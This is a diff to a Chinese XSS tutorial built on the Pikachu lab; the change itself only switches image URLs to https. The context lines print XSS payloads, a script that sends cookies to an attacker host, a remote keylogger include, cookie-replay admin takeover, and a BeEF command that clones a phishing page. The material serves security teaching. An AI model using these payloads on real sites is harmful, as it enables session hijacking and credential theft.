@@ -18,7 +18,7 @@ URL 上包含恶意脚本代码，受害者打开该 URL，恶意脚本代码被
 
 `name` 上包含了恶意脚本代码，当打开该链接，会在控制台输出 `world`：
 
-![](http://img.wukaipeng.com/2023/1015-111434-image-20231015111434122.png)
+![](https://img.wukaipeng.com/2023/1015-111434-image-20231015111434122.png)
 
 
 
@@ -26,7 +26,7 @@ URL 上包含恶意脚本代码，受害者打开该 URL，恶意脚本代码被
 >
 > 🌰 举例， `<img src=## onerror="alert(document.cookie)" />`，将用户的 cookie 显示出来：
 >
-> ![](http://img.wukaipeng.com/2023/1015-114012-image-20231015114012218.png)
+> ![](https://img.wukaipeng.com/2023/1015-114012-image-20231015114012218.png)
 
 
 
@@ -38,7 +38,7 @@ URL 上包含恶意脚本代码，受害者打开该 URL，恶意脚本代码被
 
 现在无论任何用户访问 XSS（Stored）菜单项，都会执行该恶意脚本代码：
 
-![](http://img.wukaipeng.com/2023/1015-111737-image-20231015111737024.png)
+![](https://img.wukaipeng.com/2023/1015-111737-image-20231015111737024.png)
 
 
 
@@ -52,13 +52,13 @@ XSS 盲打，属于存储型的一种，攻击者并不知道恶意代码具体�
 
 在 Pikachu 平台的 Cross-Site Scripting » XSS 之盲打菜单项下，攻击者提交恶意脚本代码：
 
-![](http://img.wukaipeng.com/2023/1015-135414-image-20231015135414216.png)
+![](https://img.wukaipeng.com/2023/1015-135414-image-20231015135414216.png)
 
 当受害者登录后台：`http://YOUR_IP_ADDRESS:8081/vul/xss/xssblind/admin_login.php`（账号密码为：`admin/123456`）
 
 可以看到我们的恶意脚本代码已经被执行了：
 
-![](http://img.wukaipeng.com/2023/1015-135749-image-20231015135749281.png)
+![](https://img.wukaipeng.com/2023/1015-135749-image-20231015135749281.png)
 
 ## 键盘记录
 
@@ -135,11 +135,11 @@ function show() {
 
 然后写到：`<script src="http://YOUR_IP_ADDRESS:PORT/pkxss/rkeypress/rk.js"></script>`
 
-![](http://img.wukaipeng.com/2023/1015-142720-image-20231015142720582.png)
+![](https://img.wukaipeng.com/2023/1015-142720-image-20231015142720582.png)
 
 然后进入 Pikachu 平台的 管理工具 » XSS 后台，然后查看「键盘记录」，现在只要存储型XSS 的留言板有键盘输入，就能够捕捉到：
 
-![](http://img.wukaipeng.com/2023/1015-142945-image-20231015142945411.png)
+![](https://img.wukaipeng.com/2023/1015-142945-image-20231015142945411.png)
 
 ## 平台利用
 
@@ -149,25 +149,25 @@ function show() {
 
 Pikachu 平台已经为我们提供了收集 Cookie 的脚本：`<script>document.write('<img src="http://YOUR_IP_ADDRESS:PORT/pkxss/xcookie/cookie.php? cookie='+document.cookie+'"/>')</script>`
 
-![](http://img.wukaipeng.com/2023/1015-153622-image-20231015153622001.png)
+![](https://img.wukaipeng.com/2023/1015-153622-image-20231015153622001.png)
 
 模拟受害者登录后台，恶意代码被执行：
 
-![](http://img.wukaipeng.com/2023/1015-153703-image-20231015153702933.png)
+![](https://img.wukaipeng.com/2023/1015-153703-image-20231015153702933.png)
 
 此时攻击者在后台看到 cookie 已经被收集上来了：
 
-![](http://img.wukaipeng.com/2023/1015-153756-image-20231015153756287.png)
+![](https://img.wukaipeng.com/2023/1015-153756-image-20231015153756287.png)
 
 现在攻击者已经拿到 Cookie 了，那么就可以登录 Admin 端了，在另外的浏览器进入地址：`http://YOUR_IP_ADDRESS:PORT/vul/xss/xssblind/admin_login.php`
 
 通过 Cookie Editor 这样的插件，攻击者把获取得到的 Cookie，包括 `ant[pw]`， `ant[uname]`，`PHPSESSID`， `security` 填写上去：
 
-![](http://img.wukaipeng.com/2023/1015-161019-image-20231015161019465.png)
+![](https://img.wukaipeng.com/2023/1015-161019-image-20231015161019465.png)
 
 接着在地址栏再输入 `http://YOUR_IP_ADDRESS:PORT/vul/xss/xssblind/admin.php`，可以看到不会被重定向到 `../admin_login.php` 页面了，而是直接登录成功
 
-![](http://img.wukaipeng.com/2023/1015-161323-image-20231015161323359.png)
+![](https://img.wukaipeng.com/2023/1015-161323-image-20231015161323359.png)
 
 > 🧐 如何防范？  
 >
@@ -194,11 +194,11 @@ http://192.168.64.4:3000/api/seng/clone_page\?token\=44738d265d43e98903df4f7b082
 
 `POST` 的目标地址是 BeEF 的地址，token 来自与 API Key，见下图：
 
- ![](http://img.wukaipeng.com/2023/1016-212812-image-20231016212812263.png)
+ ![](https://img.wukaipeng.com/2023/1016-212812-image-20231016212812263.png)
 
 克隆之后的效果：
 
-![](http://img.wukaipeng.com/2023/1016-212558-image-20231016212558649.png)
+![](https://img.wukaipeng.com/2023/1016-212558-image-20231016212558649.png)
 
 #### 克隆钓鱼网站并获取用户账号密码
 
@@ -211,15 +211,15 @@ curl -H "Content-Type: application/json; charset=UTF-8"  \
 http://192.168.64.4:3000/api/seng/clone_page?token=44738d265d43e98903df4f7b0821b4289dae1bc1
 ```
 
-![](http://img.wukaipeng.com/2023/1016-213332-image-20231016213332776.png)
+![](https://img.wukaipeng.com/2023/1016-213332-image-20231016213332776.png)
 
 在 BeEF 后台可以看到已经有其他用户上线该网站了：
 
-![](http://img.wukaipeng.com/2023/1016-213532-image-20231016213532316.png)
+![](https://img.wukaipeng.com/2023/1016-213532-image-20231016213532316.png)
 
 当用户输入账号密码后，我们也能通过 Logs 查看得到：
 
-![](http://img.wukaipeng.com/2023/1016-213903-image-20231016213903055.png)
+![](https://img.wukaipeng.com/2023/1016-213903-image-20231016213903055.png)
 
 
 
@@ -243,15 +243,15 @@ http://192.168.64.4:3000/api/seng/clone_page?token=44738d265d43e98903df4f7b0821b
 
 在 Pikachu 平台上的 Cross-Site Scripting » xss 之 htmlspecialchars 菜单项中，添加 `abc` ，可以看到它作为 `<a>` 标签的 `href` 属性：
 
-![](http://img.wukaipeng.com/2023/1015-193445-image-20231015193444939.png)
+![](https://img.wukaipeng.com/2023/1015-193445-image-20231015193444939.png)
 
 当我们输入 `' " < >` 进行测试，发现只有单引号没有被转义：
 
-![](http://img.wukaipeng.com/2023/1015-194055-image-20231015194055513.png)
+![](https://img.wukaipeng.com/2023/1015-194055-image-20231015194055513.png)
 
 那么可以利用单引号构建恶意脚本代码 `#' onclick='alert(document.cookie)`：
 
-![](http://img.wukaipeng.com/2023/1015-194315-image-20231015194314876.png)
+![](https://img.wukaipeng.com/2023/1015-194315-image-20231015194314876.png)
 
 ## 防御
 
